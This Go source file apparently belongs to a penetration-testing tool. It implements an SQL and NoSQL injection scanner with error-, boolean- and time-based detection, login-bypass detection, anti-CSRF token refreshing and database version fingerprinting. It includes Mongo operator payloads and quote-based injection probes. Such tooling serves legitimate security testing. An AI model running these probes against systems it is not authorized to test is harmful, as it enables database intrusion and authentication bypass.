package runner

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net/http"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync/atomic"
	"time"

	"dirrunner/internal/output"
)

// Default wordlists for the sqli module. All three are editable under wordlist/
// and overridable per run.
const (
	DefaultSQLiPayloads = "wordlist/sqli-payloads.txt"
	DefaultSQLiHeaders  = "wordlist/sqli-headers.txt"
	DefaultSQLiErrors   = "wordlist/sqli-errors.txt"
	DefaultSQLiBoolean  = "wordlist/sqli-boolean.txt"
	DefaultSQLiSleep    = "wordlist/sqli-sleep.txt"
)

type SQLiOptions struct {
	Targets           []string
	PayloadWordlist   string
	HeaderWordlist    string
	ErrorWordlist     string
	Encodings         []string
	XorKey            string
	BooleanWordlist   string // TAB-separated TRUE/FALSE boolean payload pairs
	SleepWordlist     string // time-based payload templates (%d = seconds)
	SleepSeconds      int    // time-based delay; 0 disables time-based detection
	Method            string // overrides the HTTP method; POST is implied when a body is set
	BodyForm          string // form-urlencoded body to test (login forms); FUZZ marks the field, else all fields
	BodyJSON          string // JSON body to test; FUZZ marks the field, else all string fields
	CSRFField         string // body field holding an anti-CSRF token to refresh before each request
	CSRFURL           string // page to GET the fresh token/cookie from (default: the target URL)
	Regx              string // also report responses matching this regex/word
	Fingerprint       bool   // identify the DBMS engine/version instead of running the full scan
	ContinueOnSuccess bool
	Workers           int
	HTTP              HTTPOptions
}

// sqliReq is one concrete request a probe sends: a method, URL, optional body
// (with its content type) and extra headers.
type sqliReq struct {
	method  string
	url     string
	body    string
	ctype   string
	headers map[string]string
}

// sqliExec sends one probe and returns status, response body prefix, size and
// elapsed time. When a CSRF field is configured and the probe has a body, it
// first fetches a fresh token (and its session cookie) and injects them, so the
// request survives anti-CSRF forms (e.g. PortSwigger login labs).
func sqliExec(ctx context.Context, client *http.Client, opts SQLiOptions, r sqliReq) (int, []byte, int64, time.Duration, error) {
	if opts.CSRFField != "" && r.body != "" {
		pageURL := opts.CSRFURL
		if pageURL == "" {
			pageURL = r.url
		}
		if token, cookie, err := fetchCSRF(ctx, client, opts.HTTP, pageURL, opts.CSRFField); err == nil && token != "" {
			r.body = setBodyField(r.body, opts.CSRFField, token, r.ctype == "application/json")
			if cookie != "" {
				r.headers = withHeader(r.headers, "Cookie", cookie)
			}
		}
	}
	extra := r.headers
	if r.ctype != "" {
		extra = withHeader(extra, "Content-Type", r.ctype)
	}
	return fetchDetectBody(ctx, client, opts.HTTP, r.method, r.url, r.body, extra)
}

// withHeader returns a copy of headers with key=value set.
func withHeader(headers map[string]string, key, value string) map[string]string {
	out := make(map[string]string, len(headers)+1)
	for k, v := range headers {
		out[k] = v
	}
	out[key] = value
	return out
}

// fetchCSRF GETs pageURL and returns a fresh token (from an input named field)
// and the session cookie set on that response, so the pair stays consistent.
func fetchCSRF(ctx context.Context, client *http.Client, httpOpts HTTPOptions, pageURL, field string) (string, string, error) {
	req, err := NewRequest(ctx, "GET", pageURL, nil, httpOpts)
	if err != nil {
		return "", "", err
	}
	resp, err := client.Do(req)
	if err != nil {
		return "", "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, detectReadCap))
	var cookies []string
	for _, c := range resp.Cookies() {
		cookies = append(cookies, c.Name+"="+c.Value)
	}
	return extractCSRFToken(string(body), field), strings.Join(cookies, "; "), nil
}

// extractCSRFToken pulls the value of an <input name="FIELD" value="..."> from
// HTML, in either attribute order.
func extractCSRFToken(html, field string) string {
	f := regexp.QuoteMeta(field)
	for _, pat := range []string{
		`(?is)name=["']?` + f + `["']?[^>]*?value=["']([^"']+)["']`,
		`(?is)value=["']([^"']+)["'][^>]*?name=["']?` + f + `["']?`,
	} {
		if m := regexp.MustCompile(pat).FindStringSubmatch(html); len(m) > 1 {
			return m[1]
		}
	}
	return ""
}

// setBodyField sets a field in a form-urlencoded or JSON body.
func setBodyField(body, field, value string, isJSON bool) string {
	if isJSON {
		var obj map[string]any
		if err := json.Unmarshal([]byte(body), &obj); err != nil {
			return body
		}
		obj[field] = value
		if b, err := json.Marshal(obj); err == nil {
			return string(b)
		}
		return body
	}
	values, err := url.ParseQuery(body)
	if err != nil {
		return body
	}
	values.Set(field, value)
	return values.Encode()
}

// autoResolveCookie makes `-C 'Name=FUZZ'` work without a manually supplied
// value: when a cookie's value starts with FUZZ (no real prefix), it GETs the
// target, reads the cookie the server issues, and prepends it so the injection
// becomes `Name=<issued>FUZZ` and the query matches a row.
func autoResolveCookie(ctx context.Context, client *http.Client, httpOpts HTTPOptions, target string) string {
	cookie := httpOpts.Cookie
	if cookie == "" || !strings.Contains(cookie, "FUZZ") {
		return cookie
	}
	needsFetch := false
	for _, part := range strings.Split(cookie, ";") {
		if _, val, ok := strings.Cut(strings.TrimSpace(part), "="); ok && strings.HasPrefix(val, "FUZZ") {
			needsFetch = true
		}
	}
	if !needsFetch {
		return cookie
	}
	// Fetch without sending the template cookie, so the server issues a fresh one.
	fetchOpts := httpOpts
	fetchOpts.Cookie = ""
	req, err := NewRequest(ctx, "GET", target, nil, fetchOpts)
	if err != nil {
		return cookie
	}
	resp, err := client.Do(req)
	if err != nil {
		return cookie
	}
	io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	issued := map[string]string{}
	for _, c := range resp.Cookies() {
		issued[c.Name] = c.Value
	}
	var out []string
	for _, part := range strings.Split(cookie, ";") {
		p := strings.TrimSpace(part)
		if name, val, ok := strings.Cut(p, "="); ok && strings.HasPrefix(val, "FUZZ") {
			if sv, has := issued[strings.TrimSpace(name)]; has && sv != "" {
				output.Info("using server-issued cookie %s as injection base", strings.TrimSpace(name))
				p = strings.TrimSpace(name) + "=" + sv + val
			}
		}
		out = append(out, p)
	}
	return strings.Join(out, "; ")
}

// hasTemplateFuzz reports whether a FUZZ marker sits in the URL, a custom header
// or the cookie (body FUZZ is handled by the body-field path).
func hasTemplateFuzz(opts SQLiOptions, target string) bool {
	if strings.Contains(target, "FUZZ") || strings.Contains(opts.HTTP.Cookie, "FUZZ") {
		return true
	}
	for k, v := range opts.HTTP.Headers {
		if strings.Contains(k, "FUZZ") || strings.Contains(v, "FUZZ") {
			return true
		}
	}
	return false
}

// templateFuzzLabel names where the FUZZ marker is, for the finding.
func templateFuzzLabel(opts SQLiOptions, target string) string {
	var parts []string
	if strings.Contains(target, "FUZZ") {
		parts = append(parts, "url")
	}
	for k, v := range opts.HTTP.Headers {
		if strings.Contains(k, "FUZZ") || strings.Contains(v, "FUZZ") {
			parts = append(parts, "header "+k)
		}
	}
	if strings.Contains(opts.HTTP.Cookie, "FUZZ") {
		parts = append(parts, "cookie")
	}
	return strings.Join(parts, ",")
}

// sqliTemplateReq builds a request with every FUZZ marker (URL, headers, cookie)
// replaced by value. The replaced header/cookie is sent via the probe's own
// header map so it overrides the static FUZZ template.
func sqliTemplateReq(opts SQLiOptions, target, method, body, ctype, value string) sqliReq {
	headers := map[string]string{}
	for k, v := range opts.HTTP.Headers {
		headers[strings.ReplaceAll(k, "FUZZ", value)] = strings.ReplaceAll(v, "FUZZ", value)
	}
	if strings.Contains(opts.HTTP.Cookie, "FUZZ") {
		headers["Cookie"] = strings.ReplaceAll(opts.HTTP.Cookie, "FUZZ", value)
	}
	return sqliReq{
		method:  method,
		url:     strings.ReplaceAll(target, "FUZZ", value),
		body:    body,
		ctype:   ctype,
		headers: headers,
	}
}

// sqliBodySetup derives the request method, the baseline body (FUZZ replaced
// with a benign value), the raw body template, its content type and whether it
// is JSON, from the options.
func sqliBodySetup(opts SQLiOptions) (method, baselineBody, rawBody, ctype string, isJSON bool) {
	switch {
	case opts.BodyJSON != "":
		rawBody, ctype, isJSON = opts.BodyJSON, "application/json", true
	case opts.BodyForm != "":
		rawBody, ctype = opts.BodyForm, "application/x-www-form-urlencoded"
	}
	baselineBody = strings.ReplaceAll(rawBody, "FUZZ", "1")
	method = opts.Method
	if method == "" {
		if rawBody != "" {
			method = "POST"
		} else {
			method = "GET"
		}
	}
	return
}

// sqliBoolPair is a boolean-based payload pair: a TRUE condition that should
// leave the page like the baseline, and a FALSE one that should change it. Both
// are appended to the injection point's original value.
type sqliBoolPair struct{ True, False string }

// loadBooleanPairs loads TAB-separated TRUE/FALSE pairs from a wordlist.
func loadBooleanPairs(path string) ([]sqliBoolPair, error) {
	lines, err := loadRawLines(path)
	if err != nil {
		return nil, err
	}
	pairs := make([]sqliBoolPair, 0, len(lines))
	for _, line := range lines {
		t, f, ok := strings.Cut(line, "\t")
		if !ok {
			return nil, fmt.Errorf("invalid boolean pair %q (expected TRUE<TAB>FALSE)", line)
		}
		pairs = append(pairs, sqliBoolPair{True: t, False: f})
	}
	return pairs, nil
}

// RunSQLi tests query parameters and request headers for SQL-injection
// indicators using three detectors: database error strings, boolean-based
// TRUE/FALSE differentials, and time-based (SLEEP) delays.
func RunSQLi(ctx context.Context, opts SQLiOptions) ([]output.Result, error) {
	basePayloads, err := LoadWordlist(firstNonEmpty(opts.PayloadWordlist, DefaultSQLiPayloads))
	if err != nil {
		return nil, fmt.Errorf("loading sqli payloads: %w", err)
	}
	headerNames, err := LoadWordlist(firstNonEmpty(opts.HeaderWordlist, DefaultSQLiHeaders))
	if err != nil {
		return nil, fmt.Errorf("loading sqli headers: %w", err)
	}
	errorPatterns, err := loadSQLErrorPatterns(firstNonEmpty(opts.ErrorWordlist, DefaultSQLiErrors))
	if err != nil {
		return nil, fmt.Errorf("loading sqli error patterns: %w", err)
	}
	booleanPairs, err := loadBooleanPairs(firstNonEmpty(opts.BooleanWordlist, DefaultSQLiBoolean))
	if err != nil {
		return nil, fmt.Errorf("loading sqli boolean pairs: %w", err)
	}
	sleepTemplates, err := loadRawLines(firstNonEmpty(opts.SleepWordlist, DefaultSQLiSleep))
	if err != nil {
		return nil, fmt.Errorf("loading sqli sleep templates: %w", err)
	}
	payloads := applyEncodings(basePayloads, opts.Encodings, opts.XorKey)

	var regx *regexp.Regexp
	if opts.Regx != "" {
		compiled, err := regexp.Compile(opts.Regx)
		if err != nil {
			return nil, fmt.Errorf("invalid --regx pattern: %w", err)
		}
		regx = compiled
		output.Info("regx filter active: %q", opts.Regx)
	}

	client := NewHTTPClient(opts.HTTP)
	method, baselineBody, rawBody, ctype, isJSON := sqliBodySetup(opts)

	var all []output.Result
	for _, target := range opts.Targets {
		if ctx.Err() != nil {
			break
		}
		output.Info("checking SQLi indicators for %s", target)
		topts := opts
		topts.HTTP.Cookie = autoResolveCookie(ctx, client, opts.HTTP, target)
		hasFuzz := hasTemplateFuzz(topts, target)
		baseReq := sqliReq{method: method, url: target, body: baselineBody, ctype: ctype}
		if hasFuzz {
			baseReq = sqliTemplateReq(topts, target, method, baselineBody, ctype, "")
		}
		baseStatus, _, baseSize, baseLatency, err := sqliExec(ctx, client, topts, baseReq)
		if err != nil {
			output.Warn("baseline request failed for %s: %v", target, err)
			continue
		}
		baseLen := int(baseSize)

		// Cancelling poolCtx on the first finding stops every in-flight probe at
		// once when --continue-on-success is off.
		poolCtx, cancel := context.WithCancel(ctx)
		var found atomic.Bool
		env := sqliEnv{
			client: client, opts: topts, target: target,
			method: method, baselineBody: baselineBody, rawBody: rawBody, ctype: ctype, isJSON: isJSON,
			hasFuzz: hasFuzz, fuzzLabel: templateFuzzLabel(topts, target), regx: regx,
			payloads: payloads, headerNames: headerNames, errorPatterns: errorPatterns,
			booleanPairs: booleanPairs, sleepTemplates: sleepTemplates,
			baseStatus: baseStatus, baseLen: baseLen, baseLatency: baseLatency,
			found: &found, cancel: cancel,
		}
		jobs := buildSQLiJobs(env)
		results, err := RunPool(poolCtx, "sqli", jobs, opts.Workers, func(ctx context.Context, job sqliJob) []output.Result {
			return job(ctx)
		})
		cancel()
		if err != nil {
			return all, err
		}
		all = append(all, results...)
	}
	return all, nil
}

// sqliJob is one detection probe that returns any findings it produces. Modeling
// each probe as an independent job lets the worker pool run them concurrently
// and drive the progress bar, while a shared atomic honours --continue-on-success.
type sqliJob func(context.Context) []output.Result

// sqliEnv bundles everything the job builders need for one target.
type sqliEnv struct {
	client         *http.Client
	opts           SQLiOptions
	target         string
	method         string
	baselineBody   string
	rawBody        string
	ctype          string
	isJSON         bool
	hasFuzz        bool
	fuzzLabel      string
	regx           *regexp.Regexp
	payloads       []string
	headerNames    []string
	errorPatterns  []*regexp.Regexp
	booleanPairs   []sqliBoolPair
	sleepTemplates []string
	baseStatus     int
	baseLen        int
	baseLatency    time.Duration
	found          *atomic.Bool
	cancel         context.CancelFunc
}

// mutation builds the request that injects value at one location (a query
// parameter, a body field or a header).
type mutation func(value string) sqliReq

func buildSQLiJobs(e sqliEnv) []sqliJob {
	stop := func() bool { return !e.opts.ContinueOnSuccess && e.found.Load() }
	mkResult := func(where, payload, indicator, variant string, status int, size int64) []output.Result {
		e.found.Store(true)
		if !e.opts.ContinueOnSuccess {
			e.cancel()
		}
		output.Warn("%s in %s with payload [%s]", indicator, where, payload)
		return []output.Result{{
			Type:   "sqli",
			Target: e.target,
			Method: e.method,
			URL:    variant,
			Status: status,
			Size:   size,
			Value:  where + " | " + payload + " | " + indicator,
		}}
	}

	var jobs []sqliJob

	// errorJobs appends one error-based job per payload for a location.
	errorJobs := func(where string, mut mutation) {
		for _, payload := range e.payloads {
			jobs = append(jobs, func(ctx context.Context) []output.Result {
				if stop() {
					return nil
				}
				r := mut(payload)
				output.Debug("error-based %s %s | %s | payload=%q", r.method, r.url, where, payload)
				status, body, size, _, err := sqliExec(ctx, e.client, e.opts, r)
				if err != nil {
					output.Debug("request error %s: %v", where, err)
					return nil
				}
				if ind := errorIndicator(body, status, e.baseStatus, e.errorPatterns); ind != "" {
					return mkResult(where, payload, ind, r.url, status, size)
				}
				if ind := authBypassIndicator(status, e.baseStatus); ind != "" {
					return mkResult(where, payload, ind, r.url, status, size)
				}
				if e.regx != nil {
					if m := e.regx.Find(body); m != nil {
						return mkResult(where, payload, "regx: "+truncateMatch(string(m)), r.url, status, size)
					}
				}
				return nil
			})
		}
	}

	// boolTimeJobs appends boolean- and time-based jobs for a location.
	boolTimeJobs := func(where, orig string, mut mutation) {
		for _, pair := range e.booleanPairs {
			jobs = append(jobs, func(ctx context.Context) []output.Result {
				if stop() {
					return nil
				}
				rt, rf := mut(orig+pair.True), mut(orig+pair.False)
				output.Debug("boolean %s | %s | TRUE=%q FALSE=%q", rt.method, where, pair.True, pair.False)
				st, _, szt, _, errT := sqliExec(ctx, e.client, e.opts, rt)
				sf, _, szf, _, errF := sqliExec(ctx, e.client, e.opts, rf)
				if errT != nil || errF != nil {
					return nil
				}
				if booleanInjectable(e.baseLen, int(szt), int(szf), e.baseStatus, st, sf) {
					return mkResult(where, pair.True+" / "+pair.False, "boolean-based TRUE/FALSE differential", rt.url, st, szt)
				}
				return nil
			})
		}
		if e.opts.SleepSeconds > 0 {
			for _, tmpl := range e.sleepTemplates {
				jobs = append(jobs, func(ctx context.Context) []output.Result {
					if stop() {
						return nil
					}
					payload := orig + fmt.Sprintf(tmpl, e.opts.SleepSeconds)
					r := mut(payload)
					output.Debug("time-based %s | %s | payload=%q", r.method, where, payload)
					if timeBasedInjectable(ctx, e.client, e.opts, r, e.baseLatency) {
						return mkResult(where, fmt.Sprintf(tmpl, e.opts.SleepSeconds), "time-based SLEEP delay confirmed", r.url, 0, 0)
					}
					return nil
				})
			}
		}
	}

	// fpJobs appends one DBMS-fingerprint job per engine for a location. Each job
	// tries the engine's payloads until one leaks a version or an engine-specific
	// error. Fingerprint findings are informational and never cancel the pool.
	fpJobs := func(where string, mut mutation) {
		for _, eng := range dbEngines {
			eng := eng
			jobs = append(jobs, func(ctx context.Context) []output.Result {
				// 1) UNION-based: the version reflects in the body between markers.
				for _, up := range eng.unionPayloads {
					r := mut(up)
					output.Debug("fingerprint %s union | %s | payload=%q", eng.name, where, up)
					status, body, size, _, err := sqliExec(ctx, e.client, e.opts, r)
					if err != nil {
						continue
					}
					if m := unionMarkerRE.FindSubmatch(body); len(m) > 1 {
						ver := collapseSpaces(string(m[1]))
						name := eng.name
						if strings.Contains(strings.ToLower(ver), "maria") {
							name = "MariaDB"
						}
						output.Success("DBMS %s %s via %s", name, ver, where)
						return []output.Result{dbmsResult(e.target, where, up, name+" "+ver, r.url, status, size)}
					}
				}
				// 2) Error-based: the version reflects in a database error.
				for _, payload := range eng.payloads {
					r := mut(payload)
					output.Debug("fingerprint %s | %s | payload=%q", eng.name, where, payload)
					status, body, size, _, err := sqliExec(ctx, e.client, e.opts, r)
					if err != nil {
						continue
					}
					if eng.versionRE != nil && (eng.detectRE == nil || eng.detectRE.Match(body)) {
						if m := eng.versionRE.FindSubmatch(body); len(m) > 1 {
							name, ver := eng.name, strings.TrimSpace(string(m[1]))
							if strings.Contains(strings.ToLower(ver), "maria") {
								name = "MariaDB"
							}
							output.Success("DBMS %s %s via %s", name, ver, where)
							return []output.Result{dbmsResult(e.target, where, payload, name+" "+ver, r.url, status, size)}
						}
					}
					if eng.detectRE != nil && eng.detectRE.Match(body) {
						output.Success("DBMS %s via %s", eng.name, where)
						return []output.Result{dbmsResult(e.target, where, payload, eng.name, r.url, status, size)}
					}
				}
				// Blind boolean fingerprint: a boolean expression whose syntax is
				// valid only on this engine returns the normal page, while a lone
				// broken quote errors. On the wrong engine the valid probe itself
				// errors. Identifies the backend even with no reflected version.
				if eng.boolProbe != "" {
					valid := "' AND (" + eng.boolProbe + ") AND 1=1-- -"
					rv := mut(valid)
					output.Debug("fingerprint %s boolean | %s", eng.name, where)
					sv, _, szv, _, errV := sqliExec(ctx, e.client, e.opts, rv)
					if errV == nil && sv == e.baseStatus && similarLen(int(szv), e.baseLen) {
						rb := mut("'")
						sb, _, szb, _, errB := sqliExec(ctx, e.client, e.opts, rb)
						if errB == nil && (sb != e.baseStatus || !similarLen(int(szb), e.baseLen)) {
							output.Success("DBMS %s (boolean-based) via %s", eng.name, where)
							return []output.Result{dbmsResult(e.target, where, valid, eng.name+" (boolean-based)", rv.url, sv, szv)}
						}
					}
				}
				// Behavioral boolean pair (e.g. NoSQL/MongoDB): a TRUE/FALSE
				// differential confirms the engine without any reflected error.
				if eng.boolTrue != "" {
					output.Debug("fingerprint %s bool-pair | %s", eng.name, where)
					rt, rf := mut(eng.boolTrue), mut(eng.boolFalse)
					st, _, szt, _, errT := sqliExec(ctx, e.client, e.opts, rt)
					sf, _, szf, _, errF := sqliExec(ctx, e.client, e.opts, rf)
					if errT == nil && errF == nil && booleanInjectable(e.baseLen, int(szt), int(szf), e.baseStatus, st, sf) {
						output.Success("DBMS %s (boolean-based) via %s", eng.name, where)
						return []output.Result{dbmsResult(e.target, where, eng.boolTrue+" / "+eng.boolFalse, eng.name+" (boolean-based)", rt.url, st, szt)}
					}
				}
				// Blind time-based fingerprint: each engine has a distinct delay
				// function, so an induced delay identifies the backend even when no
				// error or version is reflected in the response.
				if e.opts.SleepSeconds > 0 {
					for _, tmpl := range eng.sleepPayloads {
						payload := fmt.Sprintf(tmpl, e.opts.SleepSeconds)
						r := mut(payload)
						output.Debug("fingerprint %s time-based | %s | payload=%q", eng.name, where, payload)
						if timeBasedInjectable(ctx, e.client, e.opts, r, e.baseLatency) {
							output.Success("DBMS %s (time-based) via %s", eng.name, where)
							return []output.Result{dbmsResult(e.target, where, payload, eng.name+" (time-based)", r.url, 0, 0)}
						}
					}
				}
				return nil
			})
		}
	}

	// addLocation wires the right jobs for one injectable location.
	addLocation := func(where, orig string, mut mutation) {
		if e.opts.Fingerprint {
			fpJobs(where, mut)
			return
		}
		errorJobs(where, mut)
		boolTimeJobs(where, orig, mut)
	}

	// Explicit FUZZ marker in the URL, a header or the cookie: inject there with
	// all detectors (this is how blind/boolean injection in a TrackingId cookie
	// or a custom header is tested). Put the real value before FUZZ, e.g.
	// --cookie 'TrackingId=<token>FUZZ' or -H 'TrackingId: <token>FUZZ'.
	if e.hasFuzz {
		mut := func(value string) sqliReq {
			return sqliTemplateReq(e.opts, e.target, e.method, e.baselineBody, e.ctype, value)
		}
		addLocation("FUZZ ["+e.fuzzLabel+"]", "", mut)
		return jobs
	}

	// Query parameters.
	params := queryParamNames(e.target)
	if len(params) == 0 && e.rawBody == "" {
		if e.opts.Fingerprint {
			output.Warn("fingerprint needs an injectable parameter or body (none found for %s)", e.target)
		} else {
			output.Info("no query parameters found for %s", e.target)
		}
	}
	for _, name := range params {
		name := name
		where := "parameter [" + name + "]"
		orig := paramValue(e.target, name)
		mut := func(value string) sqliReq {
			return sqliReq{method: e.method, url: replaceQueryParam(e.target, name, value), body: e.baselineBody, ctype: e.ctype}
		}
		addLocation(where, orig, mut)
	}

	// Body fields (form or JSON).
	if e.rawBody != "" {
		var points []injectPoint
		if e.isJSON {
			points = jsonInjectPoints(e.rawBody)
		} else {
			points = formInjectPoints(e.rawBody)
		}
		if len(points) == 0 {
			output.Warn("could not parse request body for injection")
		}
		for _, pt := range points {
			pt := pt
			if pt.label == e.opts.CSRFField {
				continue // the CSRF token is refreshed, not injected
			}
			where := "body [" + pt.label + "]"
			mut := func(value string) sqliReq {
				return sqliReq{method: e.method, url: e.target, body: pt.build(value), ctype: e.ctype}
			}
			addLocation(where, pt.orig, mut)
		}

		// Fingerprint MongoDB via the same operator probe (a status/length change
		// when every string field becomes an operator identifies a Mongo backend).
		if e.isJSON && e.opts.Fingerprint {
			jobs = append(jobs, func(ctx context.Context) []output.Result {
				for _, op := range nosqlOperators {
					r := sqliReq{method: e.method, url: e.target, body: setAllJSONStringFields(e.rawBody, op), ctype: e.ctype}
					output.Debug("fingerprint MongoDB operator | body | %s", op)
					status, body, size, _, err := sqliExec(ctx, e.client, e.opts, r)
					if err != nil {
						continue
					}
					if errorIndicator(body, status, e.baseStatus, e.errorPatterns) != "" ||
						(status != e.baseStatus && !similarLen(int(size), e.baseLen)) {
						output.Success("DBMS MongoDB (NoSQL operator) via body")
						return []output.Result{dbmsResult(e.target, "body [operator]", op, "MongoDB (NoSQL operator)", r.url, status, size)}
					}
				}
				return nil
			})
		}

		// NoSQL operator injection (JSON bodies): replace every string field with
		// a Mongo operator object at once — the classic authentication-bypass /
		// operator-injection probe. A status/length change (often a 500) flags it.
		if e.isJSON && !e.opts.Fingerprint {
			for _, op := range nosqlOperators {
				op := op
				jobs = append(jobs, func(ctx context.Context) []output.Result {
					if stop() {
						return nil
					}
					r := sqliReq{method: e.method, url: e.target, body: setAllJSONStringFields(e.rawBody, op), ctype: e.ctype}
					output.Debug("nosql-operator %s | body | %s", r.method, op)
					status, body, size, _, err := sqliExec(ctx, e.client, e.opts, r)
					if err != nil {
						return nil
					}
					where := "body [NoSQL operator, all fields]"
					if ind := errorIndicator(body, status, e.baseStatus, e.errorPatterns); ind != "" {
						return mkResult(where, op, "NoSQL operator: "+ind, r.url, status, size)
					}
					if ind := authBypassIndicator(status, e.baseStatus); ind != "" {
						return mkResult(where, op, "NoSQL operator: "+ind, r.url, status, size)
					}
					if status != e.baseStatus && !similarLen(int(size), e.baseLen) {
						return mkResult(where, op, "NoSQL operator: response changed", r.url, status, size)
					}
					return nil
				})
			}
		}
	}

	// Request headers (error-based only; skipped in fingerprint mode), carrying
	// the baseline body.
	for _, header := range e.headerNames {
		if e.opts.Fingerprint {
			break
		}
		header := header
		mut := func(value string) sqliReq {
			return sqliReq{method: e.method, url: e.target, body: e.baselineBody, ctype: e.ctype, headers: map[string]string{header: value}}
		}
		errorJobs("header ["+header+"]", mut)
	}
	return jobs
}

// injectPoint is one injectable field in a request body.
type injectPoint struct {
	label string
	orig  string
	build func(value string) string // returns the full body with value injected
}

// formInjectPoints returns the injectable fields of a form-urlencoded body. When
// the body contains FUZZ that single marker is the injection point; otherwise
// every field is injected in turn.
func formInjectPoints(raw string) []injectPoint {
	if strings.Contains(raw, "FUZZ") {
		return []injectPoint{{label: "FUZZ", orig: "", build: func(v string) string {
			return strings.ReplaceAll(raw, "FUZZ", url.QueryEscape(v))
		}}}
	}
	values, err := url.ParseQuery(raw)
	if err != nil {
		return nil
	}
	names := make([]string, 0, len(values))
	for name := range values {
		names = append(names, name)
	}
	sort.Strings(names)
	points := make([]injectPoint, 0, len(names))
	for _, name := range names {
		name := name
		points = append(points, injectPoint{label: name, orig: values.Get(name), build: func(v string) string {
			clone := cloneValues(values)
			clone.Set(name, v)
			return clone.Encode()
		}})
	}
	return points
}

// nosqlOperators are Mongo operator objects injected in place of a string value
// to test NoSQL operator injection (authentication bypass, filter bypass).
var nosqlOperators = []string{
	`{"$ne":null}`,
	`{"$gt":""}`,
	`{"$ne":"dirrunner_nomatch"}`,
	`{"$regex":".*"}`,
}

// setAllJSONStringFields replaces every string-valued field of a JSON object
// body with the given raw-JSON value (e.g. a Mongo operator object).
func setAllJSONStringFields(raw, rawValue string) string {
	var obj map[string]any
	if err := json.Unmarshal([]byte(raw), &obj); err != nil {
		return raw
	}
	for k, v := range obj {
		if _, ok := v.(string); ok {
			obj[k] = json.RawMessage(rawValue)
		}
	}
	b, err := json.Marshal(obj)
	if err != nil {
		return raw
	}
	return string(b)
}

// jsonInjectPoints returns the injectable fields of a JSON object body. When a
// field's value contains FUZZ only those fields are injected; otherwise every
// top-level string field is.
func jsonInjectPoints(raw string) []injectPoint {
	var obj map[string]any
	if err := json.Unmarshal([]byte(raw), &obj); err != nil {
		return nil
	}
	fuzz := map[string]bool{}
	for k, v := range obj {
		if s, ok := v.(string); ok && strings.Contains(s, "FUZZ") {
			fuzz[k] = true
		}
	}
	names := make([]string, 0, len(obj))
	for k, v := range obj {
		if len(fuzz) > 0 {
			if !fuzz[k] {
				continue
			}
		} else if _, ok := v.(string); !ok {
			continue
		}
		names = append(names, k)
	}
	sort.Strings(names)
	points := make([]injectPoint, 0, len(names))
	for _, name := range names {
		name := name
		orig := ""
		if s, ok := obj[name].(string); ok {
			orig = strings.ReplaceAll(s, "FUZZ", "")
		}
		points = append(points, injectPoint{label: name, orig: orig, build: func(v string) string {
			clone := cloneMap(obj)
			// A JSON object/array payload (e.g. a Mongo operator) is injected as a
			// raw value, not quoted as a string.
			if tv := strings.TrimSpace(v); (strings.HasPrefix(tv, "{") || strings.HasPrefix(tv, "[")) && json.Valid([]byte(v)) {
				clone[name] = json.RawMessage(v)
			} else {
				clone[name] = v
			}
			b, _ := json.Marshal(clone)
			return string(b)
		}})
	}
	return points
}

func cloneValues(v url.Values) url.Values {
	out := make(url.Values, len(v))
	for k, vals := range v {
		out[k] = append([]string(nil), vals...)
	}
	return out
}

func cloneMap(m map[string]any) map[string]any {
	out := make(map[string]any, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}

// errorIndicator returns a short description when a response shows a database
// error string or a new server error, or "" otherwise. The old response-length
// delta heuristic was removed in favour of boolean-based detection, which does
// not fire on ordinary dynamic-content size variation.
func errorIndicator(body []byte, status, baseStatus int, patterns []*regexp.Regexp) string {
	for _, re := range patterns {
		if re.Match(body) {
			return "SQL error pattern detected"
		}
	}
	if status >= 500 && baseStatus < 500 {
		return "server error changed"
	}
	return ""
}

// collapseSpaces flattens whitespace (DBMS version banners are often multi-line)
// and truncates for display.
func collapseSpaces(s string) string {
	s = strings.Join(strings.Fields(s), " ")
	if len(s) > 120 {
		s = s[:120] + "…"
	}
	return s
}

// dbmsResult builds a DBMS-fingerprint finding.
func dbmsResult(target, where, payload, info, variant string, status int, size int64) output.Result {
	return output.Result{
		Type:   "dbms",
		Target: target,
		Method: "GET",
		URL:    variant,
		Status: status,
		Size:   size,
		Value:  "DBMS: " + info + " (" + where + ")",
	}
}

// authBypassIndicator flags a response that newly redirects (3xx) where the
// baseline did not. On a login form this is the classic SQL-injection auth
// bypass signal (e.g. username=administrator'-- comments out the password check
// and the app redirects to the account page). Redirect following must stay off
// (the default) for the 3xx to be observed.
func authBypassIndicator(status, baseStatus int) string {
	redirect := status >= 300 && status < 400
	baseRedirect := baseStatus >= 300 && baseStatus < 400
	if redirect && !baseRedirect {
		return fmt.Sprintf("new redirect %d (baseline %d) — possible login/auth bypass", status, baseStatus)
	}
	return ""
}

// booleanInjectable reports a boolean-based injection signal: exactly one of the
// TRUE/FALSE responses resembles the baseline while the other diverges (and the
// two differ). This catches both directions — a TRUE that keeps the page like
// the baseline (classic SQL conditional) and a TRUE that returns *more* rows
// (e.g. a NoSQL `||'1'=='1'` that makes the filter always true).
func booleanInjectable(baseLen, lenTrue, lenFalse, baseStatus, statusTrue, statusFalse int) bool {
	diff := absInt(lenTrue - lenFalse)
	tol := 24
	if t := baseLen / 500; t > tol {
		tol = t
	}
	if diff > tol {
		// Exactly one side should sit close to the baseline relative to the
		// TRUE/FALSE gap. This works whether the differential is small (a SQL
		// conditional toggling one line) or large (a NoSQL `||'1'=='1'` returning
		// every row), and tolerates small echo noise around the baseline.
		tClose := 4*absInt(lenTrue-baseLen) <= diff
		fClose := 4*absInt(lenFalse-baseLen) <= diff
		if tClose != fClose {
			return true
		}
	}
	if statusTrue != statusFalse && (statusTrue == baseStatus || statusFalse == baseStatus) {
		return true
	}
	return false
}

func absInt(x int) int {
	if x < 0 {
		return -x
	}
	return x
}

// similarLen reports whether two body lengths are close enough to be the same
// page. The tolerance is small and nearly fixed: conditional-response blind SQLi
// often toggles only a short string (a "Welcome back" line is ~60 bytes), so a
// percentage-of-page tolerance would swallow the signal. The triple guard in
// booleanInjectable (TRUE≈baseline, FALSE≠baseline, TRUE≠FALSE) keeps this from
// firing on ordinary pages.
func similarLen(a, b int) bool {
	tol := 24.0
	if t := float64(b) * 0.002; t > tol { // 0.2% only matters for very large pages
		tol = t
	}
	return math.Abs(float64(a-b)) <= tol
}

// timeBasedInjectable sends a SLEEP probe and confirms a delay with a second
// request to avoid flagging a one-off slow response.
